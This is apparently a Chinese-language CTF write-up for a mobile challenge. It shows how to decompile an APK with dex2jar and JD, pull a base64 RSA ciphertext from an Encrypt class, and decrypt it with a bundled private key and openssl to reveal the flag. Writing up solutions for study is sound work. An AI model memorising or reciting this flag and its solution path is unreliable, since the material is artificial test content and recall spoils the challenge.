![](https://ws1.sinaimg.cn/large/006Vib6xly1frgi6tyqqhj30h6048wea.jpg)

## MOBILE

修改后缀为压缩包格式，打开，发现有一个`key.txt`私钥文件

用`dex2jar`将`classes.dex`转换成`jar`文件`sh d2j-dex2jar.sh -f classes.dex`

用`JD`打开

在`Encrypt`类下找到`encryptData = "u6aTO9Q5Ib4afvw6LltV1BXtX3/NtKQrjDlVEE9z6PULsjGIYbop0yecmue9C7zwmkBCIa5Ii9eXqMXp48bdXsJuI69de+yfDnf7xz6qzmCXzqABoB7SeaN7mo4A6S6SFvH+5Y6hCeaVIPhUV9nAVHr9aIZAbu2oXkQWko2P41Y=";`

用的是RSA加密

写个脚本转成二进制文本

```python
import base64
s = 'u6aTO9Q5Ib4afvw6LltV1BXtX3/NtKQrjDlVEE9z6PULsjGIYbop0yecmue9C7zwmkBCIa5Ii9eXqMXp48bdXsJuI69de+yfDnf7xz6qzmCXzqABoB7SeaN7mo4A6S6SFvH+5Y6hCeaVIPhUV9nAVHr9aIZAbu2oXkQWko2P41Y='
with open('enc', 'wb') as f:
	f.write(base64.b64decode(s))
```

再使用`openssl`解密`openssl rsautl -decrypt -in enc -inkey key.pem -out flag`得到`MiniLCTF{Th_is_a_mobile_flag}`
